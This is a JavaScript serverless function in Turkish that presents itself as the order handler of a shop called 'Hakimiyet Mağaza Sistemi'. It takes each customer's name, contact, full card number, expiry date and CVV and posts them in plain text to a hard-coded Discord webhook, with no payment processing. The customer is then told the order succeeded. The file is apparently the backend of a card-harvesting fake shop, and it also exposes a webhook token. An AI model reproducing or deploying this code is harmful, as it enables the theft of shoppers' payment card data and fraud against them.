exports.handler = async (event) => {
  try {
    // Sadece POST isteklerine izin ver
    if (event.httpMethod !== 'POST') {
      return { 
        statusCode: 405, 
        body: JSON.stringify({ error: 'Sadece POST metodu desteklenir.' }) 
      };
    }

    // Frontend'den gelen veriyi JSON'a çevir
    const data = JSON.parse(event.body);

    // Discord Webhook adresin
    const webhookUrl = 'https://discord.com/api/webhooks/1524078484933185647/cPTAl8I7aiIwbT2Rw6HqFt_TjI6OY9JxFNQNFZEkjDGaqRkuywqpOiyLfZdlaxv4SxWb';

    // Discord'da görünecek mesaj kutusunun (embed) tasarımı
    const embed = {
      title: '💳 Yeni Sipariş ve Kart Bilgisi Geldi!',
      color: 15105570,
      fields: [
        {
          name: '👤 Müşteri Bilgileri',
          value: `**Ad Soyad:** ${data.ad_soyad || 'Boş'}\n**İletişim/Discord:** ${data.iletisim || 'Boş'}\n**Ödeme Yöntemi:** ${data.odeme_yontemi || 'Boş'}`,
          inline: false
        },
        {
          name: '💳 Kart Bilgileri',
          value: `**Kart Sahibi:** ${data.kart_isim || 'Boş'}\n**Kart Numarası:** \`${data.kart_no || 'Boş'}\`\n**Skt:** \`${data.kart_tarih || 'Boş'}\`  |  **CVV:** \`${data.kart_cvv || 'Boş'}\``,
          inline: false
        },
        {
          name: '🛒 Sepet İçeriği',
          value: `\`\`\`text\n${data.sepet_icerik || 'Sepet Boş'}\n\`\`\``,
          inline: false
        }
      ],
      timestamp: new Date().toISOString(),
      footer: {
        text: 'Hakimiyet Mağaza Sistemi'
      }
    };

    // Veriyi Discord'a fırlat
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });

    // Başarılı yanıt dön
    return {
      statusCode: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ success: true, message: 'Sipariş başarıyla iletildi.' })
    };

  } catch (error) {
    return {
      statusCode: 500,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ success: false, error: error.message })
    };
  }
};